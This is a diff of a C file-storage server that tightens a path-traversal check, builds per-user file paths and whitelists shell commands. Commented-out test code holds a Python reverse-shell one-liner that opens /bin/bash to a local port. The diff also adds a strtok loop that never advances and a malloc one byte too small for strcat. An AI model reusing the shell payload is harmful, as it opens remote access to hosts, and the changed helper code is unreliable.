@@ -12,7 +12,7 @@ char* get_file(char* filename);
 int execute_command_from_file(char* filename);
 int traversal(char* filename);
 int store_file(char* filename, char* text);
-char* substring(char* string, int spot);
+char* substring(char* string, char* delim, int spot);
 int input_validation_command(char* command);
 char* get_location(char* filename);
 
@@ -25,17 +25,19 @@ Small functions
 */
 
 // Attempts to stop directory traversal
+// If directory traversal, return true. False otherwise
 int traversal(char* filename){
-	if(strstr(filename, "..")){
-		return 0;
+	if(strstr(filename, "..") || strstr(filename, "/")){
+		return 1;
 	}
-	return 1;
+	return 0;
 }
 
 // Allocates a folder for the user.
 int create_storage(char* user){
 	int go = traversal(user);
-	if(go == 0){
+	printf("%d", go);
+	if(go == 1 || go == -1){
 		return 0;
 	}
 
@@ -43,15 +45,17 @@ int create_storage(char* user){
 	    mkdir(user, 0700);
 		return 1;
 	}
+
 	return 0;
 }
 
 //checks to see if the user if valid.
 int is_user(char* user){
-	if(!traversal(user)){
-		return 0;
+	if(traversal(user)){
+		return -1;
 	}
 
+	printf("Directory: %s",user);
 	if (stat(user, &st) == -1) {
 		return 0;
 	}
@@ -59,19 +63,17 @@ int is_user(char* user){
 }
 
 // Gets a substring of 'string' from the nth spot -1.
-char* substring(char* string, int spot){
+char* substring(char* string, char* delim, int spot){
 	int count = 0;
-	char delim[] = " ";
-
 	char* str = strdup(string); // ate up old string
 
-	char* pch = strtok (str, " ");
+	char* pch = strtok(str, delim);
 	while (pch != NULL)
 	{
 		if(spot == count){
 			return pch;
 		}
-		pch = strtok (NULL, " ");
+		pch = strtok (str, delim);
 		count +=1;
 	}
 
@@ -80,7 +82,7 @@ char* substring(char* string, int spot){
 
 // switches the location of the user
 int switch_location(char* user){
-	if(!traversal(user)){
+	if(traversal(user)){
 		return 0;
 	}
 	strncpy(directory, user, 300);
@@ -170,18 +172,26 @@ int execute_command_from_file(char* filename){
 int store_file(char* filename, char* text){
 
 	// store the file on the OS
-	if(!traversal(filename)){
+	if(traversal(filename)){
 		return 0;
 	}
 
-	FILE *f = fopen(filename, "w");
+	// creates a file with the name user_directory/filename
+	char *file_spot = malloc(strlen(filename) + strlen(directory) + 1);
+	strcpy(file_spot, directory);
+	strcat(file_spot, "/");
+	strcat(file_spot, filename);
+
+	FILE *f = fopen(file_spot, "w"); // attempts to open a file
 	if (f == NULL)
 	{
 	   return 0;
 	}
 
-	fprintf(f, "%s", text);
+	fprintf(f, "%s", text); // writes to the file
 	fclose(f);
+
+	free(file_spot);
 	return 1;
 }
 
@@ -226,16 +236,16 @@ int input_validation_command(char* command){
 	}
 
 	//whitelists of commands - More should be coming soon!
-	if(!strcmp(substring(command,0),"ls")){
+	if(!strcmp(substring(command," ", 0),"ls")){
 		return 1;
 	}
-	else if(!strcmp(substring(command,0),"stat")){
+	else if(!strcmp(substring(command, " ", 0),"stat")){
 		return 1;
 	}
-	else if(!strcmp(substring(command,0),"file")){
+	else if(!strcmp(substring(command, " ", 0),"file")){
 		return 1;
 	}
-	else if(!strcmp(substring(command,0),"cat")){
+	else if(!strcmp(substring(command, " ", 0),"cat")){
 		return 1;
 	}
 	else{
@@ -251,22 +261,22 @@ char* get_location(char* filename){
 	return file_spot;
 }
 
-int main(){
-	char command[] = "ls ";
-
-	// Server side of things... Will have a CLI to view options!
-	switch_location("Max");
-	// store_file("Max/hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
-
-	//
-	// execute_command(command);
-
-	char hex[010];
-	execute_command_from_file("hack.me");
-	//create_storage("Max");
-	// printf("%d", switch_location("Max"));
-	return 0;
-}
+// int main(){
+// 	char command[] = "ls ";
+//
+// 	// Server side of things... Will have a CLI to view options!
+// 	switch_location("Max");
+// 	// store_file("Max/hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
+//
+// 	//
+// 	// execute_command(command);
+//
+// 	char hex[010];
+// 	execute_command_from_file("hack.me");
+// 	//create_storage("Max");
+// 	// printf("%d", switch_location("Max"));
+// 	return 0;
+// }
 
 /*
 All of this is per user! So, do we need a login, to access your section? I think this probably works the best!
